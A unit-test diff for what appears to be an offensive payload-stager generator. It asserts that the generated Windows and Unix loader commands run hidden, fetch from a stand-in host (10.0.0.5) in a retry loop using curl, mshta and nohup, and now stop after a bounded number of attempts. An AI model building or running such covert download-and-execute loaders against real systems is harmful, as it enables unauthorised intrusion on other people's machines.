@@ -46,9 +46,13 @@ class TestShortStager(unittest.TestCase):
         cmd = ss.build_short_stager(
             "windows", "https://10.0.0.5:8443/s", host="10.0.0.5", port=8443)
         self.assertIn("-w h", cmd)                 # hidden
-        self.assertIn("while(1)", cmd)             # retry loop
         self.assertIn("sleep", cmd)                # cadence
         self.assertIn("10.0.0.5", cmd)
+        # retry loop, BOUNDED: `while(1)` against a dead endpoint left an
+        # invisible process polling for ever, so the loop now carries its
+        # attempt budget in the typed text
+        self.assertIn(f"while($i -lt {ss.DEFAULT_ATTEMPTS})", cmd)
+        self.assertNotIn("while(1)", cmd)
 
     def test_windows_mshta_is_shortest_but_one_shot(self):
         cmd = ss.build_short_stager(
@@ -73,6 +77,9 @@ class TestShortStager(unittest.TestCase):
         self.assertIn("while ! curl", cmd)
         self.assertIn("nohup", cmd)
         self.assertIn("10.0.0.5", cmd)
+        # same budget as the Windows loader, and the same reason
+        self.assertIn(f"[ $i -ge {ss.DEFAULT_ATTEMPTS} ]", cmd)
+        self.assertIn("exit 1", cmd)
 
     def test_macos_supported(self):
         cmd = ss.build_short_stager("macos", "https://h/p",
